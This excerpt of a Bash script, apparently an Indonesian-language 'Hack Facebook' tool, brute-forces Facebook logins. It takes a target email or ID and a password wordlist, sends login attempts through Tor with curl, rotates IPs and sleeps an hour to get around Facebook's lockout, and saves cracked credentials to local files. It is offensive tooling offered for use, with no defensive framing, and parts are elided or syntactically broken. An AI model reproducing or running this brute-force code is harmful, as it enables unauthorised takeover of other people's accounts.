...
checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77mGunakan Script Ini Jika Sudah Di Root!\n\e[0m"
    exit 1
fi
}
...
printf "\e[1;77m   _    _            _      ______             _                 _      _   _               \n\e[0m"
printf "\e[1;77m  | |  | |          | |    |  ____|           | |               | |    | \ | |               \n\e[0m"
printf "\e[1;77m  | |__| | __ _  ___| | __ | |__ __ _  ___ ___| |__   ___   ___ | | __ |  \| | _____      __ \n\e[0m"
printf "\e[1;77m  |  __  |/ _` |/ __| |/ / |  __/ _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ / | . ` |/ _ \ \ /\ / / \n\e[0m"
printf "\e[1;77m  | |  | | (_| | (__|   <  | | | (_| | (_|  __/ |_) | (_) | (_) |   <  | |\  |  __/\ V  V / \n\e[0m"
printf "\e[1;77m  |_|  |_|\__,_|\___|_|\_\ |_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\ |_| \_|\___| \_/\_/  \n\e[0m"
printf "\n"
printf "\e[1;104m    Sebelum Mencoba Harap Baca Bismillah *_*,Recoded By  Mr.Rush     \e[0m\n"
printf "\n"
printf "\e[1;41m                     Peringatan!!                      \e[0m\n"
printf "\n\e[1;91mDi Ingat Cok!! Facebook Akan Blokir Akun Selama 1jam,setelah 15-20 password salah\n"
...
read -p $'\e[1;92mEmail Target/ID Target: \e[0m' EMAIL
default_wl_pass="passwords.lst"
read -p $'\e[1;92mPassword List (Tekan Untuk Untuk Password Default): \e[0m' wl_pass
...
if [[ -n "$PASS" ]]; Sabar..
printf "\e[1;91m [*] Tunggu Sebentar Jancokkk...\n\e[0m"
sleep 3
fi
default_session="Y"
printf "\n\e[1;77mSession Telah Di Simpan..\e[0m\e[1;92m %s \e[0m" $EMAIL
...
printf "\e[1;77mSession Di Save.\e[0m\n"
...
printf "\e[1;92mEmail Target/ID Target:\e[0m\e[1;77m %s\e[0m\n" $EMAIL
printf "\e[1;92mWordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Pencet Ctrl+c Untuk Stop atau Simpan Session\n\e[0m"
}
...
printf "\e[1;77mMencoba Password (%s/%s)\e[0m: %s\n" $token $count_pass $PASS

{( trap '' SIGINT && curl -s -X GET --socks5-hostname localhost:9050 'https://www.facebook.com/home.php' --user-agent $USER_AGENT --cookie $COOKIES --cookie-jar $COOKIES --location > /dev/null && curl -s -X POST --socks5-hostname localhost:9050 'https://login.facebook.com/login.php'  --user-agent $USER_AGENT --data-urlencode "email=${EMAIL}" --data-urlencode "pass=${PASS}" --cookie $COOKIES --cookie-jar $COOKIES > /dev/null && var=$( curl -s -X GET --socks5-hostname localhost:9050 'https://www.facebook.com/home.php'  --user-agent $USER_AGENT --cookie $COOKIES --cookie-jar $COOKIES | grep -o "logoutMenu\|account is temporarily unavailable" | uniq ); if [[ $var == "logoutMenu" ]]; then printf "\e[1;92m \n [*] Password Ditemukan: %s\n " $PASS; printf "Username: %s, Password: %s\n" $EMAIL $PASS >> Memory ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $check == "account is temporarily unavailable" ]]; then printf "\e[1;92m \n [*] Password Found or false positive: %s\n [*] Flag can be false positive\n" $PASS; printf "Username: %s, Password: %s\n" $EMAIL $PASS >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; fi; ) } & done; wait $!;
rm -rf cookies$countpass
changeip
...
dat=$(($hourdate + 1))
mindate=$(date +%M:%S)
printf "\e[1;91m[*] Silahkan Tunggu 1 Jam! :\e[0m\e[1;93m %s:%s\n\e[0m" $dat $mindate
let turn+=20
sleep 3600
resumemethod2
hourdate2=$(date +%H)
